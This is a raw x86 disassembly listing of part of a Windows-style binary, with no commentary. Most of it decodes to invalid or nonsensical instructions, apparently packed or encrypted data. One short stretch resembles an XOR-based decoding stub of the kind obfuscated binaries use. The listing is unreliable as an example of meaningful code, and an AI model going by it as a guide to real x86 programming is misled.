  40e51a:	jno    0x40e4ac
  40e51c:	mov    edi,0x92318b6
  40e521:	pop    ecx
  40e522:	or     ch,BYTE PTR [esi-0x3b78e464]
  40e528:	sti    
  40e529:	sahf   
  40e52a:	xlat   BYTE PTR ds:[ebx]
  40e52b:	call   0x4ea4:0x9e460607
  40e532:	lahf   
  40e533:	pushf  
  40e534:	or     bh,BYTE PTR [edi+0x66]
  40e537:	cmp    al,bh
  40e539:	push   es
  40e53a:	mov    edi,0x95cd7e20
  40e53f:	mov    ecx,0x4d640a31
  40e544:	mov    esp,DWORD PTR [edi]
  40e546:	fidivr WORD PTR [eax-0x66]
  40e549:	mov    cl,0x3a
  40e54b:	xor    ch,dl
  40e54d:	cdq    
  40e54e:	fsub   DWORD PTR [edi+0x5d594c53]
  40e554:	jmp    0x9b074474
  40e559:	loopne 0x40e576
  40e55b:	pop    eax
  40e55c:	push   edx
  40e55d:	add    BYTE PTR [eax-0x13c001cb],cl
  40e563:	dec    eax
  40e564:	sub    al,0x89
  40e566:	xchg   ebx,eax
  40e567:	call   0x3b11:0x7f1b663f
  40e56e:	push   esp
  40e56f:	jl     0x40e592
  40e571:	pop    esi
  40e572:	xor    esp,DWORD PTR [esi+ebp*1+0x10cb7c69]
  40e579:	xchg   esi,ebx
  40e57b:	mov    ah,0xb4
  40e57d:	mul    ah
  40e57f:	loop   0x40e5bd
  40e581:	stos   DWORD PTR es:[edi],eax
  40e582:	data16 xor BYTE PTR [edi-0x27d49d27],0x62
  40e58a:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40e58c:	sar    BYTE PTR [edi],1
  40e58e:	mov    dh,0x7
  40e590:	fisttp QWORD PTR [ecx+0x42a85fd8]
  40e596:	sub    al,0x83
  40e598:	xor    ebp,DWORD PTR [ebx-0x71]
  40e59b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e59c:	push   cs
  40e59d:	shl    BYTE PTR [ebx-0x31760bfc],1
  40e5a3:	xchg   ecx,eax
  40e5a4:	inc    edi
  40e5a5:	dec    esp
  40e5a6:	xchg   ecx,eax
  40e5a7:	ins    BYTE PTR es:[edi],dx
  40e5a8:	ret    0xd747
  40e5ab:	shl    BYTE PTR [ebx],cl
  40e5ad:	loop   0x40e57e
  40e5af:	ins    DWORD PTR es:[edi],dx
  40e5b0:	inc    edi
  40e5b1:	out    dx,al
  40e5b2:	(bad)  
  40e5b3:	mov    ah,0xa4
  40e5b5:	iret   
  40e5b6:	adc    ebx,DWORD PTR ds:0x1394ff87
  40e5bc:	mov    bl,0x8
  40e5be:	and    al,0x2d
  40e5c0:	ins    BYTE PTR es:[edi],dx
  40e5c1:	add    DWORD PTR [ebx+eiz*4],0x71493741
  40e5c8:	or     ecx,ebx
  40e5ca:	xor    DWORD PTR [ecx],0x16fddbcf
  40e5d0:	jecxz  0x40e61b
  40e5d2:	pop    esp
  40e5d3:	push   ds
  40e5d4:	ja     0x40e639
  40e5d6:	sbb    al,0xc
  40e5d8:	xchg   esp,eax
  40e5d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5da:	loope  0x40e588
  40e5dc:	rol    edx,0x69
  40e5df:	popa   
  40e5e0:	push   edi
  40e5e1:	sbb    al,0xb6
  40e5e3:	mov    al,ds:0x623c15e3
  40e5e8:	out    0xaf,al
  40e5ea:	pop    ss
  40e5eb:	popa   
  40e5ec:	add    bh,cl
  40e5ee:	adc    DWORD PTR [edx-0x6cc834f8],edx
  40e5f4:	aad    0x8e
  40e5f6:	xor    DWORD PTR [ecx],esi
  40e5f8:	adc    al,0xed
  40e5fa:	pop    ebp
  40e5fb:	test   al,0x60
  40e5fd:	xchg   ecx,eax
  40e5fe:	in     eax,0xd7
  40e600:	mov    edi,0x967cdf78
  40e605:	sub    esp,DWORD PTR [ecx+0x30]
  40e608:	cld    
  40e609:	mov    ch,0xa1
  40e60b:	cmp    DWORD PTR [ebp-0x31a797d1],edx
  40e611:	push   0x7e73b2fc
  40e616:	orps   xmm2,xmm3
  40e619:	mov    al,BYTE PTR [ecx-0x5b]
  40e61c:	push   esi
  40e61d:	pop    ss
  40e61e:	sbb    DWORD PTR [ebp+0x62aa6c3c],eax
  40e624:	mov    al,0xd2
  40e626:	and    eax,0x20046565
  40e62b:	sbb    ch,BYTE PTR [edx]
  40e62d:	cmp    al,0x41
  40e62f:	mov    ds:0x6eb10262,eax
  40e634:	jg     0x40e644
  40e636:	push   es
  40e637:	cmp    al,al
  40e639:	mov    dl,0x9e
  40e63b:	cmp    eax,0x7d4bcc6e
  40e640:	and    ch,bl
  40e642:	div    DWORD PTR ds:0x4dae6f53
  40e648:	mov    ds:0xc341aeff,eax
  40e64d:	mov    ch,0x9c
  40e64f:	mov    bh,0x14
  40e651:	mov    BYTE PTR [ebx-0x276bef11],0x77
  40e658:	ins    DWORD PTR es:[edi],dx
  40e659:	cli    
  40e65a:	scas   eax,DWORD PTR es:[edi]
  40e65b:	xor    ah,BYTE PTR [edi+eiz*1]
  40e65e:	jp     0x40e63d
  40e660:	and    esp,DWORD PTR [edi]
  40e662:	inc    esp
  40e663:	je     0x40e690
  40e665:	daa    
  40e666:	mov    ah,0x63
  40e668:	adc    al,0xbc
  40e66a:	push   0xaa1624f9
  40e66f:	xor    al,0x4
  40e671:	add    eax,0xf6d9b00f
  40e676:	adc    DWORD PTR [esi-0x4f],ebx
  40e679:	or     bh,dl
  40e67b:	xchg   esp,eax
  40e67c:	pop    es
  40e67d:	ss jg  0x40e65a
  40e680:	loop   0x40e64f
  40e682:	ret    
  40e683:	or     DWORD PTR [esi-0x17],ecx
  40e686:	outs   dx,DWORD PTR ds:[esi]
  40e687:	add    BYTE PTR [ebx-0x7d],0x6f
  40e68b:	pushf  
  40e68c:	repz rol BYTE PTR [ebx+edi*4],cl
  40e690:	xor    BYTE PTR [esi+0x64],ah
  40e693:	out    0x7a,al
  40e695:	loop   0x40e669
  40e697:	int3   
  40e698:	repnz pop ds
  40e69a:	ficom  DWORD PTR gs:[esi+0x5b]
  40e69e:	and    eax,0xbc24b534
  40e6a3:	std    
  40e6a4:	add    al,0x7b
  40e6a6:	cmp    al,0xf5
  40e6a8:	jg     0x40e6fa
  40e6aa:	aam    0x1e
  40e6ac:	cld    
  40e6ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6ae:	shl    DWORD PTR [esi+ebp*8-0x74],1
  40e6b2:	mov    ds:0x5c8af189,eax
  40e6b7:	mov    esp,0xc33c0eff
  40e6bc:	(bad)  
  40e6bd:	or     cl,BYTE PTR [eax]
  40e6bf:	out    0x2c,al
  40e6c1:	test   BYTE PTR [edx+ebx*8+0x6260adcf],0xba
  40e6c9:	mov    ah,0x6e
  40e6cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6cc:	stos   DWORD PTR es:[edi],eax
  40e6cd:	dec    ebp
  40e6ce:	push   ss
  40e6cf:	pop    ds
  40e6d0:	push   0xffffffdf
  40e6d2:	scas   al,BYTE PTR es:[edi]
  40e6d3:	mov    ds:0x217483d8,al
  40e6d8:	shr    BYTE PTR [ecx],1
  40e6da:	push   cs
  40e6db:	push   bp
  40e6dd:	mov    DWORD PTR [edi+0x46],esi
  40e6e0:	mov    al,ds:0xe0ad65cd
  40e6e5:	pop    DWORD PTR [ebp+0x18]
  40e6e8:	(bad)
  40e6eb:	push   ecx
  40e6ec:	retf   0x401f
  40e6ef:	xchg   esi,eax
  40e6f0:	push   eax
  40e6f1:	imul   BYTE PTR [edi+0x3608dcd5]
  40e6f7:	or     ebx,ecx
  40e6f9:	or     bl,BYTE PTR [esi-0xe7be0a3]
  40e6ff:	scas   al,BYTE PTR es:[edi]
  40e700:	and    eax,0xf31e1396
  40e705:	aad    0x3c
  40e707:	retf   
  40e708:	push   cs
  40e709:	test   al,0xc6
  40e70b:	neg    BYTE PTR [eax-0xb652a19]
  40e711:	add    esp,edi
  40e713:	cmp    eax,0xd041f04e
  40e718:	sub    bh,al
  40e71a:	mov    ebp,0x9702dac9
  40e71f:	popf   
  40e720:	jae    0x40e763
  40e722:	lea    ebx,[ecx+0x8344052]
  40e728:	sbb    DWORD PTR [ecx],ebp
  40e72a:	cwde   
  40e72b:	in     eax,dx
  40e72c:	xchg   dh,ch
  40e72e:	jge    0x40e726
  40e730:	test   DWORD PTR [edi],ecx
  40e732:	cmp    al,0x71
  40e734:	inc    esp
  40e735:	cmp    eax,0xe96416bf
  40e73a:	inc    ebp
  40e73b:	mov    cl,0xab
  40e73d:	xlat   BYTE PTR ds:[ebx]
  40e73e:	loop   0x40e6d1
  40e740:	mov    ch,BYTE PTR [ecx-0x1a172c0f]
  40e746:	bts    DWORD PTR [esi+0x84ef9f3],esi
  40e74d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e74e:	mov    WORD PTR [esi],es
  40e750:	fstp   DWORD PTR ds:0xb3fea688
  40e756:	push   ss
  40e757:	xor    eax,0xc5e12aec
  40e75c:	aad    0x4
  40e75e:	push   eax
  40e75f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e760:	fwait
  40e761:	jo     0x40e7be
  40e763:	inc    ebx
  40e764:	dec    edx
  40e765:	stos   BYTE PTR es:[edi],al
  40e766:	mov    al,ds:0xcf03a48e
  40e76b:	in     al,dx
  40e76c:	sub    DWORD PTR [edi+edi*4],0xffffff9c
  40e770:	jnp    0x40e6f8
  40e772:	or     al,0x82
  40e774:	push   esp
  40e775:	(bad)  
  40e776:	in     eax,0xfa
  40e778:	sub    edi,DWORD PTR [ecx]
  40e77a:	jmp    0x80b6df4e
  40e77f:	mov    ch,0x69
  40e781:	mov    esp,0x9831b74b
  40e786:	push   ebp
  40e787:	aam    0x75
  40e789:	ficomp DWORD PTR [edi-0x7872aea6]
  40e78f:	ret    0x27ff
  40e792:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e793:	test   ah,bl
  40e795:	aam    0x8c
  40e797:	fs fs or eax,0x76eb53c
  40e79e:	mov    al,ds:0xdc229ae4
  40e7a3:	ror    BYTE PTR [eax-0x472fe8b1],0xda
  40e7aa:	test   BYTE PTR [ebx+0x30],0x7c
  40e7ae:	mov    ebp,DWORD PTR [edi+0x12ecb280]
  40e7b4:	dec    esi
  40e7b5:	sbb    ch,0xa0
  40e7b8:	jns    0x40e81a
  40e7ba:	jno    0x40e767
  40e7bc:	ins    BYTE PTR es:[edi],dx
  40e7bd:	addr16 push esi
  40e7bf:	ror    ebx,1
  40e7c1:	(bad)  
  40e7c2:	mov    ch,0x67
  40e7c4:	and    DWORD PTR [ebx-0x3afe9ebf],0x38538ed3
  40e7ce:	xlat   BYTE PTR ds:[ebx]
  40e7cf:	iret   
  40e7d0:	bound  ecx,QWORD PTR [eax-0x6b]
  40e7d3:	xor    ebx,eax
  40e7d5:	fidivr DWORD PTR [edx+0x2d]
  40e7d8:	lds    ecx,FWORD PTR [esi+0x78fc721e]
  40e7de:	sub    ebx,DWORD PTR [edx+0x4d]
  40e7e1:	jae    0x40e7f4
  40e7e3:	rcl    ch,1
  40e7e5:	mov    edi,0xb68be3c4
  40e7ea:	add    ah,BYTE PTR ds:0xe4be4f47
  40e7f0:	dec    eax
  40e7f1:	fdivr  QWORD PTR [ebx+ebx*2-0x7c205c38]
  40e7f8:	rcr    cl,1
  40e7fa:	(bad)  
  40e7fb:	push   ebp
  40e7fc:	mov    eax,edi
  40e7fe:	mov    al,ds:0x7c862599
  40e803:	sbb    edi,DWORD PTR [ecx+0x3242fd5b]
  40e809:	icebp  
  40e80a:	iret   
  40e80b:	push   ebx
  40e80c:	or     al,0xdc
  40e80e:	mov    cl,0xb2
  40e810:	ins    DWORD PTR es:[edi],dx
  40e811:	lahf   
  40e812:	pop    edx
  40e813:	scas   al,BYTE PTR es:[edi]
  40e814:	test   BYTE PTR [edx],ah
  40e816:	adc    DWORD PTR [ebp+0x7e],ecx
  40e819:	add    bl,ch
  40e81b:	fstp   DWORD PTR cs:[ebp+0x4da12af5]
  40e822:	retf   
  40e823:	cmc    
  40e824:	xor    eax,0xe413069
  40e829:	imul   esi,DWORD PTR [ebx+edx*1+0x15],0x3e3b2f25
  40e831:	shl    DWORD PTR [ebx+0xb1ade39],0x10
  40e838:	enter  0x992d,0xe4
  40e83c:	jnp    0x40e7f7
  40e83e:	cmp    DWORD PTR [esi+0x69],0xfdc2e69a
  40e845:	rcl    BYTE PTR [edx],cl
  40e847:	dec    ecx
  40e848:	add    BYTE PTR [ebx+0x2c],dh
  40e84b:	cli    
  40e84c:	sbb    BYTE PTR [ebx-0x42],bl
  40e84f:	dec    esp
  40e850:	add    ah,BYTE PTR [ecx-0x3b]
  40e853:	lods   al,BYTE PTR ds:[esi]
  40e854:	lds    ebx,FWORD PTR [ebx+0x58466ab2]
  40e85a:	inc    esi
  40e85b:	es mov ch,0xee
  40e85e:	in     al,dx
  40e85f:	loopne 0x40e8cf
  40e861:	push   edi
  40e862:	xchg   ebx,eax
  40e863:	mov    ecx,0xf61aa34
  40e868:	adc    ch,BYTE PTR [edx]
  40e86a:	mov    edx,0x18ef9962
  40e86f:	mov    ebp,0x8b2ac57f
  40e874:	cmp    BYTE PTR [eax+0xa],ah
  40e877:	repz add eax,0x2fa43a56
  40e87d:	dec    ebx
  40e87e:	pop    edi
  40e87f:	dec    esi
  40e880:	jmp    0xf752:0x4f29107
  40e887:	mov    eax,ds:0x35ca6b83
  40e88c:	in     eax,0x5e
  40e88e:	push   ss
  40e88f:	sub    dh,BYTE PTR gs:[ebx-0x52]
  40e893:	mov    esi,0x88c4ec11
  40e898:	ret    
  40e899:	std    
  40e89a:	test   al,0xbd
  40e89c:	mov    ecx,DWORD PTR [ebp-0x20]
  40e89f:	mov    esi,DWORD PTR ds:0x434455
  40e8a5:	mov    esi,DWORD PTR [esi]
  40e8a7:	xor    DWORD PTR ds:0x43439e,esi
  40e8ad:	mov    esi,0x7510855
  40e8b2:	xor    DWORD PTR ds:0x4343a2,0x4326ec
  40e8bc:	xor    eax,esi
  40e8be:	add    eax,ebx
  40e8c0:	mov    DWORD PTR ds:0x432dc2,0x3895
  40e8ca:	cmp    ecx,eax
  40e8cc:	mov    DWORD PTR ds:0x434411,0xed9
  40e8d6:	je     0x40fd3a
  40e8dc:	push   DWORD PTR [ebp-0x20]
  40e8df:	adc    DWORD PTR ds:0x432dc2,0x4326f8
  40e8e9:	push   DWORD PTR [ebp+0x8]
  40e8ec:	call   0x404cd4
  40e8f1:	jmp    0x40ece5
  40e8f6:	ret    
  40e8f7:	rcr    BYTE PTR [ebp-0x67],1
  40e8fa:	popa   
  40e8fb:	cdq    
  40e8fc:	ret    
  40e8fd:	xor    WORD PTR [eax],0xffa7
  40e901:	fidivr DWORD PTR [ebp+0x2b8849f8]
  40e907:	call   0x7070:0x7d497070
  40e90e:	cld    
  40e90f:	jnp    0x40e971
  40e911:	cmc    
  40e912:	rol    DWORD PTR [ebx+0x79],cl
  40e915:	sar    DWORD PTR [ecx],0xe
  40e918:	not    BYTE PTR [eax-0x78f65f7e]
  40e91e:	inc    esi
  40e91f:	jecxz  0x40e8f1
  40e921:	bnd jb 0x40e8cd
  40e924:	fadd   st(5),st
  40e926:	mov    gs,WORD PTR [ebp-0x32776875]
  40e92c:	lock jae 0x40e960
  40e92f:	inc    ecx
  40e930:	imul   ebx,DWORD PTR [eax],0x137f0d5b
  40e936:	inc    esi
  40e937:	ds imul ebx,ebp,0xffffffb0
  40e93b:	sahf   
  40e93c:	repz sbb ch,BYTE PTR [edx-0x2451a5c6]
  40e943:	sar    BYTE PTR [ecx+edi*2-0x2],1
  40e947:	sub    al,0xaa
  40e949:	test   ebp,ebx
  40e94b:	dec    edi
  40e94c:	jge    0x40e9c7
  40e94e:	mov    ecx,0x31bfa6f
  40e953:	xor    bl,ch
  40e955:	mov    edx,0xbe8753bc
  40e95a:	mov    ch,BYTE PTR [edi-0x25a5fd7b]
  40e960:	out    dx,eax
  40e961:	inc    esp
  40e962:	pop    esi
  40e963:	dec    edx
  40e964:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e965:	je     0x40e9cf
  40e967:	xchg   BYTE PTR [eax],dl
  40e969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e96a:	jl     0x40e992
  40e96c:	or     DWORD PTR [ebx],0x800296fe
  40e972:	xchg   edi,eax
  40e973:	hlt    
  40e974:	add    al,BYTE PTR [ecx]
  40e976:	jge    0x40e9a4
  40e978:	push   ecx
  40e979:	xchg   DWORD PTR [ebx+0x4e4f0ed3],esi
  40e97f:	add    bl,BYTE PTR [edi+ebp*2-0x3c]
  40e983:	addr16 retf 0x4e00
  40e987:	mov    ds:0x4da4d27f,al
  40e98c:	test   BYTE PTR [esi],0x53
  40e98f:	repnz adc BYTE PTR [eax],0x1d
  40e993:	sti    
  40e994:	loope  0x40e928
  40e996:	push   0xffffffa8
  40e998:	test   DWORD PTR [ecx+0x685b37c5],edx
  40e99e:	xchg   BYTE PTR [eax+0x7c5df537],al
  40e9a4:	and    eax,0xf8361980
  40e9a9:	push   eax
  40e9aa:	jp     0x40e940
  40e9ac:	stos   BYTE PTR es:[edi],al
  40e9ad:	jbe    0x40ea20
  40e9af:	lock sbb al,0x1d
  40e9b2:	cmp    BYTE PTR [ebp-0x47ec8e77],bh
  40e9b8:	and    ebp,edi
  40e9ba:	pop    edx
  40e9bb:	add    al,0x79
  40e9bd:	push   ebx
  40e9be:	push   es
  40e9bf:	hlt    
  40e9c0:	xor    al,0x98
  40e9c2:	repnz test DWORD PTR [ebp+0x4271f1af],edi
  40e9c9:	inc    eax
  40e9ca:	inc    eax
  40e9cb:	xlat   BYTE PTR ds:[ebx]
  40e9cc:	adc    al,0x20
  40e9ce:	pop    esp
  40e9cf:	in     eax,dx
  40e9d0:	outs   dx,BYTE PTR ds:[esi]
  40e9d2:	icebp  
  40e9d3:	add    eax,0xb857fa4f
  40e9d8:	fidivr WORD PTR [ebx-0x71]
  40e9db:	adc    esp,DWORD PTR [edx-0x38]
  40e9de:	outs   dx,DWORD PTR ds:[esi]
  40e9df:	jmp    0x40ea2b
  40e9e1:	xor    DWORD PTR [edi-0x2e6a06e5],esp
  40e9e7:	xchg   edx,eax
  40e9e8:	sub    DWORD PTR [eax+0x2],ebp
  40e9eb:	xchg   esi,eax
  40e9ec:	pop    ebp
  40e9ed:	out    0x13,al
  40e9ef:	inc    ebp
  40e9f0:	enter  0xd7d2,0x51
  40e9f4:	sahf   
  40e9f5:	cmp    bh,cl
  40e9f7:	or     al,0x70
  40e9f9:	jmp    0x40ea65
  40e9fb:	adc    eax,0x17020ed1
  40ea00:	adc    eax,0x1b2b4738
  40ea05:	out    0x28,eax
  40ea07:	out    dx,al
  40ea08:	xor    eax,0x7f9307c9
  40ea0d:	sub    eax,0x75f12ba4
  40ea12:	push   ss
  40ea13:	pop    ebx
  40ea14:	cwde   
  40ea15:	xor    DWORD PTR [edx+eax*2-0x2834e2aa],esp
  40ea1c:	mov    cl,0xdf
  40ea1e:	fidiv  DWORD PTR [edi+0x9aec19a]
  40ea24:	sub    ebp,edi
  40ea26:	sub    BYTE PTR [edx-0x7198345],bh
  40ea2c:	mov    esi,es
  40ea2e:	arpl   WORD PTR [edi+esi*4],si
  40ea31:	sub    ebp,edx
  40ea33:	mov    edi,DWORD PTR [edx-0x66]
  40ea36:	cmc    
  40ea37:	rcl    DWORD PTR [ebx+0x71],1
  40ea3a:	out    dx,al
  40ea3b:	pop    esi
  40ea3c:	sbb    DWORD PTR [eax+0x78],0x69
  40ea40:	(bad)
  40ea44:	xlat   BYTE PTR ds:[ebx]
  40ea45:	jnp    0x40ea10
  40ea47:	adc    DWORD PTR [ebp+0xd],eax
  40ea4a:	jae    0x40ea92
  40ea4c:	and    BYTE PTR [ebp+0x7],cl
  40ea4f:	inc    esp
  40ea50:	xor    eax,0x8a979460
  40ea55:	or     al,0x41
  40ea57:	push   eax
  40ea58:	dec    ebx
  40ea59:	xor    ebp,esp
  40ea5b:	shr    esi,0xb
  40ea5e:	mov    bl,0x58
  40ea60:	pop    ecx
  40ea61:	fs and eax,0x84dfda1b
  40ea67:	out    dx,eax
  40ea68:	jmp    edx
  40ea6a:	sti    
  40ea6b:	mov    ebp,0x96f9a933
  40ea70:	add    eax,0xcceaa01f
  40ea75:	ret    0xbb34
  40ea78:	push   ebp
  40ea79:	stc    
  40ea7a:	imul   edi,edx,0x2f2d6284
  40ea80:	xchg   esp,eax
  40ea81:	dec    ebp
  40ea82:	(bad)  
  40ea83:	outs   dx,BYTE PTR ds:[esi]
  40ea84:	xor    al,0xb9
  40ea86:	hlt    
  40ea87:	pop    eax
  40ea88:	test   DWORD PTR [ebx-0x4cc78f22],esi
  40ea8e:	mov    eax,ds:0xb55cffc6
  40ea93:	mov    dl,0xf9
  40ea95:	test   DWORD PTR [edx-0x31364614],esp
  40ea9b:	jo     0x40ea4c
  40ea9d:	or     ebx,esi
  40ea9f:	adc    dl,dl
  40eaa1:	out    dx,al
  40eaa2:	add    eax,0x28358e90
  40eaa7:	mov    esp,0x4d6d7490
  40eaac:	ins    DWORD PTR es:[edi],dx
  40eaad:	xchg   ebp,eax
  40eaae:	add    eax,0x2a7a5a7e
  40eab3:	pop    ecx
  40eab4:	jecxz  0x40eb18
  40eab6:	test   al,0x84
  40eab8:	xchg   esi,eax
  40eab9:	in     al,dx
  40eaba:	dec    esp
  40eabb:	stos   DWORD PTR es:[edi],eax
  40eabc:	mov    bh,bh
  40eabe:	int3   
  40eabf:	idiv   DWORD PTR [edx-0x705dfd45]
  40eac5:	inc    esi
  40eac6:	inc    eax
  40eac7:	push   cs
  40eac8:	fadd   st(4),st
  40eaca:	cmp    cl,cl
  40eacc:	lods   eax,DWORD PTR ds:[esi]
  40eacd:	lods   eax,DWORD PTR ds:[esi]
  40eace:	hlt    
  40eacf:	cmc    
  40ead0:	jl     0x40eafd
  40ead2:	add    BYTE PTR [ecx],al
  40ead4:	mov    esi,0x139bcf68
  40ead9:	(bad)  
  40eada:	(bad)  
  40eadc:	in     al,dx
  40eadd:	inc    ebp
  40eade:	pop    esi
  40eadf:	pop    edx
  40eae0:	pop    ebp
  40eae1:	xor    ch,BYTE PTR [ebx]
  40eae3:	lock cmp BYTE PTR [ecx-0x4c],cl
  40eae7:	jno    0x40eb26
  40eae9:	push   0x8beca3a8
  40eaee:	jns    0x40eaef
  40eaf0:	mov    al,0x7
  40eaf2:	ss push cs
  40eaf4:	jne    0x40eb1d
  40eaf6:	add    eax,0xd87977da
  40eafb:	out    dx,eax
  40eafc:	sahf   
  40eafd:	push   cs
  40eafe:	pusha  
  40eaff:	and    dh,BYTE PTR [edx]
  40eb01:	mov    bl,0x52
  40eb03:	outs   dx,BYTE PTR ds:[esi]
  40eb04:	mov    bl,0x5d
  40eb06:	and    al,0x4e
  40eb08:	push   0xfffffff2
  40eb0a:	push   0xffffffe6
  40eb0c:	push   ebx
  40eb0d:	mov    ebp,0x7a9d309f
  40eb12:	jle    0x40eb87
  40eb14:	xchg   edx,eax
  40eb15:	test   DWORD PTR [edx],0xa72cbf5
  40eb1b:	rcr    DWORD PTR [eax+0x71],cl
  40eb1e:	jo     0x40eb37
  40eb20:	in     al,0x62
  40eb22:	inc    edx
  40eb23:	mov    dh,0xa6
  40eb25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb26:	aas    
  40eb27:	dec    edx
  40eb28:	stos   DWORD PTR es:[edi],eax
  40eb29:	mov    esi,DWORD PTR [edx-0x61d48a1e]
  40eb2f:	push   edx
  40eb30:	adc    ch,0x46
  40eb33:	cmc    
  40eb34:	shl    BYTE PTR [ebx],cl
  40eb36:	loopne 0x40eb65
  40eb38:	push   cs
  40eb39:	pop    ss
  40eb3a:	xor    ebx,DWORD PTR [edx+0x6b5cd0be]
  40eb40:	lods   eax,DWORD PTR ds:[esi]
  40eb41:	inc    esp
  40eb42:	(bad)  
  40eb43:	int    0x22
  40eb45:	sub    al,cl
  40eb47:	popa   
  40eb48:	push   0xd06f6cb2
  40eb4d:	repnz and DWORD PTR [ebp+edi*4-0x3a950dda],0x9c4442e7
  40eb59:	cmp    eax,0x95e640c1
  40eb5e:	enter  0xf58,0x55
  40eb62:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40eb64:	shr    dh,1
  40eb66:	xor    eax,0x44d81331
  40eb6c:	mov    ds:0x49fa67ff,eax
  40eb71:	sahf   
  40eb72:	dec    ch
  40eb74:	lea    ecx,[edx+0x6e1d6f90]
  40eb7a:	pop    edi
  40eb7b:	cld    
  40eb7c:	es leave 
  40eb7e:	loope  0x40ebc6
  40eb80:	fldcw  WORD PTR [ecx]
  40eb82:	or     eax,0x704c2d7b
  40eb87:	fld    DWORD PTR [ebx]
  40eb89:	mov    DWORD PTR [ecx-0x27],0x452f6654
  40eb90:	jecxz  0x40eb41
  40eb92:	clc    
  40eb93:	inc    edi
  40eb94:	push   esi
  40eb95:	mov    ds,WORD PTR [edx-0x33]
  40eb98:	lods   al,BYTE PTR ds:[esi]
  40eb99:	ja     0x40eb87
  40eb9b:	dec    edi
  40eb9c:	inc    ecx
  40eb9d:	addr16 loop 0x40eb62
  40eba0:	jge    0x40eb98
  40eba2:	data16 jl 0x40ec05
  40eba5:	push   ebx
  40eba6:	retf   
  40eba7:	push   ebx
  40eba8:	jle    0x40eb95
  40ebaa:	fiadd  WORD PTR [ecx-0x6b09b8f5]
  40ebb0:	popf   
  40ebb1:	xchg   ebx,eax
  40ebb2:	xor    DWORD PTR [ebx],edi
  40ebb4:	shr    DWORD PTR [edx+eax*2+0x12],1
  40ebb8:	adc    ebx,esi
  40ebba:	mov    DWORD PTR fs:[esi+0x2],ebp
  40ebbe:	loopne 0x40ebea
  40ebc0:	cmp    dh,ah
  40ebc2:	fs inc esp
  40ebc4:	pushf  
  40ebc5:	stc    
  40ebc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebc7:	pop    eax
  40ebc8:	sar    esp,1
  40ebca:	mov    ds:0x9ec10abb,eax
  40ebcf:	xchg   esp,eax
  40ebd0:	push   ebx
  40ebd1:	xor    DWORD PTR [ebp-0xc744ef1],ebx
  40ebd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebd8:	into   
  40ebd9:	into   
  40ebda:	and    edx,eax
  40ebdc:	retf   
  40ebdd:	js     0x40eb99
  40ebdf:	and    eax,0xad00de68
  40ebe4:	sub    edi,DWORD PTR [edi+edi*4+0x2a]
  40ebe8:	cdq    
  40ebe9:	ret    
  40ebea:	addr16 iret 
  40ebec:	and    al,0x3d
  40ebee:	push   ecx
  40ebef:	in     al,dx
  40ebf0:	push   edi
  40ebf1:	pop    edx
  40ebf2:	mov    al,0x35
  40ebf4:	jp     0x40ec25
  40ebf6:	or     al,0x3f
  40ebf8:	jno    0x40ebb7
  40ebfa:	imul   sp,WORD PTR [ecx],0xff85
  40ebfe:	jp     0x40ec35
  40ec00:	dec    eax
  40ec01:	sbb    ch,BYTE PTR [eax+0x4941eb18]
  40ec07:	xchg   edx,eax
  40ec08:	cmp    ah,BYTE PTR [esi+0x7364cf24]
  40ec0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec0f:	leave  
  40ec10:	add    esp,esp
  40ec12:	adc    dl,ch
  40ec14:	scas   eax,DWORD PTR es:[edi]
  40ec15:	lods   al,BYTE PTR ds:[esi]
  40ec16:	ins    DWORD PTR es:[edi],dx
  40ec17:	jbe    0x40eba1
  40ec19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec1a:	push   sp
  40ec1c:	jl     0x40ebbe
  40ec1e:	or     BYTE PTR [ebp-0x67],cl
  40ec21:	mov    bl,0xc3
  40ec23:	mov    ebx,0x402bed0b
  40ec28:	in     al,0x10
  40ec2a:	mov    esp,0xd6158d4d
  40ec2f:	in     al,dx
  40ec30:	xor    al,dl
  40ec32:	lods   al,BYTE PTR ds:[esi]
  40ec33:	rcr    bh,1
  40ec35:	jge    0x40ec38
  40ec37:	loope  0x40ec2d
  40ec39:	pop    ss
  40ec3a:	test   BYTE PTR [ebp-0x625ad1dd],ch
  40ec40:	pusha  
  40ec41:	ret    0x6a7f
  40ec44:	add    eax,0x9d0b826d
  40ec49:	fstp   TBYTE PTR [ebp+0x6b602146]
  40ec4f:	push   eax
  40ec50:	jns    0x40eca6
  40ec52:	fstp   DWORD PTR [esi]
  40ec54:	add    BYTE PTR [esp+eax*2],bh
  40ec57:	adc    BYTE PTR [ebx+0x70c8e816],0x22
  40ec5e:	retf   0x1b22
  40ec61:	or     eax,0xa879f76d
  40ec66:	push   ecx
  40ec67:	dec    ebx
  40ec68:	mov    DWORD PTR [esi+ecx*2+0x4],edx
  40ec6c:	jp     0x40ece5
  40ec6e:	(bad)  
  40ec6f:	push   ds
  40ec70:	sub    dl,BYTE PTR [edx+0x78e5c928]
  40ec76:	fucomi st,st(1)
  40ec78:	inc    ecx
  40ec79:	pop    ss
  40ec7a:	xchg   ebp,eax
  40ec7b:	pop    ecx
  40ec7c:	pop    ds
  40ec7d:	mov    al,ds:0xe45b19
  40ec82:	cmp    DWORD PTR [ebx+eiz*1-0x7f],edx
  40ec86:	mov    ecx,0x4df6cce2
  40ec8b:	mov    ebp,es
  40ec8d:	test   BYTE PTR [ecx+0x32],0x18
  40ec91:	jnp    0x40ecd8
  40ec93:	mov    ebx,0x4366e6ea
  40ec98:	or     esi,ebx
  40ec9a:	call   0x3d29b3b4
  40ec9f:	cmp    BYTE PTR [esi+0x2b],al
  40eca2:	(bad)
  40eca6:	out    0x5e,al
  40eca8:	mov    ds:0xd6284f35,eax
